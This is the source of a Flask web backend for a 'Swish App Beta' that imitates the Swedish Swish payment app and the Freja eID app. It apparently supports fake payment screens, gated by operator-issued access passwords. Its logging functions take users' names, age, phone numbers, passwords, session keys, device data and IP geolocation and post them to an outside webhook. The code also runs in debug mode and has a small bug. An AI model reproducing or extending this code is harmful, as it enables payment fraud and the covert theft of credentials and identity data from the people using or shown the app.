import json
import math
import os
import re
import time
import urllib
from datetime import datetime, timedelta, timezone
from threading import Thread
from time import sleep
from urllib.parse import unquote

import bcrypt
import flask
import requests
from flask import (
    Flask,
    jsonify,
    redirect,
    render_template,
    request,
    send_file,
    send_from_directory,
    session,
    url_for,
)
from flask import request as httpRequest
from flask_cors import CORS, cross_origin
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_login import (
    LoginManager,
    UserMixin,
    current_user,
    login_required,
    login_user,
    logout_user,
)
from flask_wtf import CSRFProtect
from replit import db

webhook_url = os.environ['WEBHOOK_URL']

databaseNames = {
    "swish": {
        "instanceOne": "passwords",
        "instanceTwo": "passwords2"
    },
    "freja": {
        "instanceOne": "freja_passwords",
        "instanceTwo": "freja_passwords2"
    }
}

swishDBName = databaseNames["swish"]["instanceTwo"]
frejaDBName = databaseNames["freja"]["instanceTwo"]

if (db.get(swishDBName) is None):
  db[swishDBName] = {}
if (db.get(frejaDBName) is None):
  db[frejaDBName] = {}


def getDBname(appType):
  if appType == "swish":
    return swishDBName
  if appType == "freja":
    return frejaDBName


def swishDatabase():
  return db.get(swishDBName)


def frejaDatabase():
  return db.get(frejaDBName)


def appendToDB(database, password, iswhitelisted, expiryutc):
  database[password] = {
      "iswhitelisted": iswhitelisted,
      "password": key,
      "expiryUTC": expiryutc
  }


for key, value in swishDatabase().items():
  if "Dict" not in str(type(value)):
    appendToDB(swishDatabase(), key, value, math.inf)
for key, value in frejaDatabase().items():
  if "Dict" not in str(type(value)):
    appendToDB(frejaDatabase(), key, value, math.inf)

app = Flask(__name__)
app.secret_key = os.urandom(12)  # Replace with a strong, random secret key
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(days=31)

cors = CORS(app)
app.config['CORS_HEADERS'] = 'Content-Type'

login_manager = LoginManager()
login_manager.init_app(app)

csrf = CSRFProtect(app)
csrf.init_app(app)

limiter = Limiter(
    get_remote_address,
    app=app,
    default_limits=["2000 per day", "500 per hour"],
    storage_uri="memory://",
)


class User(UserMixin):

  def __init__(self, user_id, password_hash, is_admin=False):
    self.id = user_id
    self.password_hash = password_hash  # Store the password hash in the User object
    self.is_admin = is_admin


users = {
    os.environ['ADMIN_USER_ID']: {
        'password_hash':
        bcrypt.hashpw(os.environ['ADMIN_PASSWORD'].encode('utf-8'),
                      bcrypt.gensalt()),
        'is_admin':
        True
    }
}


@login_manager.user_loader
def load_user(user_id):
  user_data = users.get(user_id)
  if user_data:
    return User(user_id, user_data['password_hash'], user_data['is_admin'])


@app.before_request
def handle_preflight():
  if httpRequest.method == "OPTIONS":
    res = flask.Response()
    res.headers['X-Content-Type-Options'] = '*'
    return res


@app.route('/', methods=['GET', 'POST'])
def index():
  ip = httpRequest.environ.get(
      'HTTP_X_FORWARDED_FOR') or httpRequest.environ['REMOTE_ADDR']

  #if httpRequest.method == "OPTIONS":
    #print(httpRequest, httpRequest.method, httpRequest.json))
  if httpRequest.method == 'POST':
    jsonData = httpRequest.json
    #print(jsonData)
    requestType = jsonData["type"]

    if requestType == "log":
      hookLog(jsonData, ip)
    if requestType == "freja":
      #print(1)
      frejaLog(jsonData, ip)
    if requestType == "urldecode":
      return urlDecode(jsonData)

  return render_template('index.html')


@app.route('/validate', methods=['GET', 'POST'])
@limiter.limit("20 per minute")
def validate():
  ip = httpRequest.environ.get(
      'HTTP_X_FORWARDED_FOR') or httpRequest.environ['REMOTE_ADDR']
  if httpRequest.method == 'POST':
    jsonData = httpRequest.json
    #print(jsonData)
    requestType = jsonData["type"]

    if requestType == "password":
      validatePassword(swishDBName, jsonData, ip)
    if requestType == "frejapassword":
      return validatePassword(frejaDBName, jsonData, ip)

  return "OK"


@app.route('/login', methods=['GET', 'POST'])
def login():
  if request.method == 'POST':
    user_id = request.form.get('user_id')
    password = request.form.get('password')
    user = users.get(user_id)

    if user and bcrypt.checkpw(password.encode('utf-8'),
                               user['password_hash']):
      user_obj = User(user_id, user['password_hash'], user['is_admin'])
      login_user(user_obj)
      session.permanent = True
      return redirect(url_for('admin'))
  return render_template('login.html')


@app.route('/admin', methods=['GET', 'POST', 'OPTIONS'])
@login_required
def admin():
  if not current_user.is_authenticated:
    return "Unauthorized: You must be logged in to access this page"
  if not current_user.is_admin:
    return "Unauthorized: You must be an admin to access this page"
    
  return render_template('admin.html',
                         flaskIndex=flaskIndex,
                         dbPasswords=swishDatabase() or {},
                         dbFrejaPasswords=frejaDatabase() or {},
                         changelogDatasave=db.get("changelog") or "",
                         time=time.time()
                        )


@app.route('/logout')
@login_required
def logout():
  logout_user()
  return redirect(url_for('login'))


@app.route('/processForm', methods=['GET', 'POST'])
# @login_required
def processForm():
  if not current_user.is_authenticated:
    return "Unauthorized: You must be logged in to access this page"
  if not current_user.is_admin:
    return "Unauthorized: You must be an admin to access this page"

  if httpRequest.method == "POST":
    #print(httpRequest.form.get("passwordToAdd"),
          #httpRequest.form.get("appType"))

    #print(db.get(getDBname(httpRequest.form.get("appType"))))
    database = db.get(getDBname(httpRequest.form.get("appType")))

    if "passwordToAdd" in httpRequest.form:
      passwordInput = httpRequest.form["passwordToAdd"].lower()
      database[passwordInput] = {
          "expiryUTC": math.inf,
          "iswhitelisted": True,
          "password": passwordInput
      }

    if "passwordToRemove" in httpRequest.form:
      passwordInput = httpRequest.form["passwordToRemove"].lower()
      if (database.get(passwordInput) == None):
        database[passwordInput] = {
            "expiryUTC": math.inf,
            "iswhitelisted": False,
            "password": passwordInput
        }
      database[passwordInput]["iswhitelisted"] = False

    if "passwordToDelete" in httpRequest.form:
      del database[httpRequest.form["passwordToDelete"].lower()]

    if "formType" in httpRequest.form:
      if httpRequest.form.get("formType") == "editRow":
        original_item = httpRequest.form.get("originalItem")
        new_item = httpRequest.form.get("newItem")

        #print(new_item.lower(), original_item.lower())

        if new_item.lower() != original_item.lower():
          if new_item.lower() != "":
            database[new_item.lower()] = {
                "expiryUTC": math.inf,
                "iswhitelisted": True,
                "password": database[original_item.lower()]["password"]
            }
            del database[original_item.lower()]
          else:
            del database[original_item.lower()]

  return "Form processed successfully"


@app.route('/g', methods=['GET', 'POST', 'OPTIONS'])
@cross_origin()
def g():
  #print(1)
  ip = httpRequest.environ.get(
      'HTTP_X_FORWARDED_FOR') or httpRequest.environ['REMOTE_ADDR']

  #print(ip, )
  return send_from_directory("static/images", "g.png", mimetype='image/png')


@app.route('/generateQr/', methods=[
    'GET',
    'POST',
])
def generateQr():

  data, color = httpRequest.args.get('data'), httpRequest.args.get('color')

  data = re.sub("-", "", data, count=1)

  return render_template("qr.html", data=data, color=str(color))


flaskIndex = ""


def output(data):
  global flaskIndex
  #print(data)
  flaskIndex += f"<p>{data}</p>"


now = datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

ipLink = "http://ip-api.com/json/{}?fields=status,message,country,region,regionName,city,district,zip,timezone,isp,org,as,query"


def returnIPCreds(ip):
  queryLink = ipLink.format(ip)
  response = requests.get(queryLink)
  return json.dumps(json.loads(response.text), indent=4, ensure_ascii=False)


def hookLog(jsonData, ip):
  data = {
      "content":
      None,
      "embeds": [{
          "title":
          "Swish App Beta",
          "description":
          "Incident has been logged",
          "color":
          None,
          "fields": [{
              "name": "> Date",
              "value": jsonData.get("date") or "Couldn't fetch"
          }, {
              "name": "> Name",
              "value": jsonData.get("name") or "Couldn't fetch"
          }, {
              "name": "> Number",
              "value": jsonData.get("number") or "Couldn't fetch"
          }, {
              "name": "> Payout",
              "value": jsonData.get("payout") or "Couldn't fetch"
          }, {
              "name": "> Message",
              "value": jsonData.get("message") or "Couldn't fetch"
          }, {
              "name":
              "> Using Light Mode",
              "value":
              str(jsonData.get("isLightMode")) or "Couldn't fetch"
          }, {
              "name": "> Password Credentials",
              "value": jsonData.get("password") or "Couldn't fetch"
          }, {
              "name": "> User Session Key",
              "value": jsonData.get("user_key") or "Couldn't fetch"
          }, {
              "name":
              "> Device Access",
              "value": (jsonData.get("platform") or "Couldn't fetch") + " (" +
              str(jsonData.get("screen_width") or "Couldn't fetch") + ", " +
              str(jsonData.get("screen_height") or "Couldn't fetch") + ")"
          }, {
              "name": "> User Agent",
              "value": jsonData.get("user_agent") or "Couldn't fetch"
          }, {
              "name": "> IP Address",
              "value": returnIPCreds(ip) or "Couldn't fetch"
          }],
          "footer": {
              "text": "Sent from Swish App"
          }
      }],
      "attachments": []
  }
  response = requests.post(webhook_url, json=data)

  #print(response.status_code, response.reason)
  #print(response.content)


def validatePassword(dbName, jsonData, ip):
  validation = "invalid"
  input = jsonData.get("password")
  user_key = jsonData.get("user_key")
  correctedInput = input.lower().strip()
  database = db.get(dbName)
  if (database.get(correctedInput)):
    if (database.get(correctedInput)["iswhitelisted"] == True):
      validation = "valid"
    if (database.get(correctedInput)["iswhitelisted"] == False):
      validation = "blacklisted"

  data = {"user_key": user_key, "response": validation, "password": input}
  pandaSuiteWebhook = jsonData["webhook_url"]

  response = requests.post(pandaSuiteWebhook, json=data, verify=True)

  #print(data)
  #print(response.status_code)
  #print(response.content)

  color = "16711680"
  if validation == "valid":
    color = "65280"

  app = "Swish"

  #print(dbName, frejaDBName)

  if dbName == frejaDBName:
    app = "Freja"

  hookdata = {
      "content":
      None,
      "embeds": [{
          "title":
          "Swish App Beta",
          "description":
          app + " Password Attempt",
          "color":
          color,
          "fields": [{
              "name": "> Date",
              "value": jsonData.get("date") or "Couldn't fetch"
          }, {
              "name": "> Password",
              "value": input or "Couldn't fetch"
          }, {
              "name": "> Validation",
              "value": validation or "Couldn't fetch"
          }, {
              "name": "> User Session Key",
              "value": jsonData.get("user_key") or "Couldn't fetch"
          }, {
              "name":
              "> Device Access",
              "value": (jsonData.get("platform") or "Couldn't fetch") + " (" +
              str(jsonData.get("screen_width") or "Couldn't fetch") + ", " +
              str(jsonData.get("screen_height") or "Couldn't fetch") + ")"
          }, {
              "name": "> User Agent",
              "value": jsonData.get("user_agent") or "Couldn't fetch"
          }, {
              "name": "> IP Address",
              "value": returnIPCreds(ip) or "Couldn't fetch"
          }],
          "footer": {
              "text": "Sent from Swish App"
          }
      }],
      "attachments": []
  }
  hookresponse = requests.post(webhook_url, json=hookdata, verify=True)
  #print(hookresponse.status_code)
  #print(hookresponse.content)

  return data


def urlDecode(jsonData):
  split = jsonData["qrData"].split(";")

  number, payout, message = None, None, None

  if len(split) >= 3:
    number = split[0][1:]
    payout = split[1]
    message = urllib.parse.unquote_plus(split[2])
  else:
    if len(split) == 1:
      number = split[0][1:]
    else:
      return "Malformed Query", 400

  if payout != None and payout != "":
    payout += " kr"

  return {"name": "", "number": number, "payout": payout, "message": message}


def frejaLog(jsonData, ip):
  #print(json.dumps(jsonData, indent=4, ensure_ascii=False))
  hookdata = {
      "content":
      None,
      "embeds": [{
          "title":
          "Swish App Beta",
          "description":
          "ID for freja has been logged",
          "color":
          "252415",
          "fields": [{
              "name": "> Date",
              "value": jsonData.get("date") or "Couldn't fetch"
          }, {
              "name": "> Efternamn",
              "value": jsonData.get("efternamn") or "Couldn't fetch"
          }, {
              "name": "> Namn",
              "value": jsonData.get("namn") or "Couldn't fetch"
          }, {
              "name": "> Ålder",
              "value": jsonData.get("ålder") or "Couldn't fetch"
          }, {
              "name": "> Datum",
              "value": jsonData.get("date") or "Couldn't fetch"
          }, {
              "name": "> Password Credentials",
              "value": jsonData.get("password") or "Couldn't fetch"
          }, {
              "name":
              "> Device Access",
              "value": (jsonData.get("platform") or "Couldn't fetch") + " (" +
              str(jsonData.get("screen_width") or "Couldn't fetch") + ", " +
              str(jsonData.get("screen_height") or "Couldn't fetch") + ")"
          }, {
              "name": "> User Agent",
              "value": jsonData.get("user_agent") or "Couldn't fetch"
          }, {
              "name": "> IP Address",
              "value": returnIPCreds(ip) or "Couldn't fetch"
          }],
          "footer": {
              "text": "Sent from Swish App"
          }
      }],
      "attachments": []
  }
  hookresponse = requests.post(webhook_url, json=hookdata)
  #print(hookresponse.status_code)
  #print(hookresponse.content)


"""validatePassword({
  "user_key": "abc",
  "type": "password",
  "password": "yes",
  "webhook_url":  "https://pandasuite.com/mo/hooks/648f6ecbb7af563bc5000823/c30714b9579d7ebfa39780638d0db137/dataReceived"
})"""

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000, debug=True)
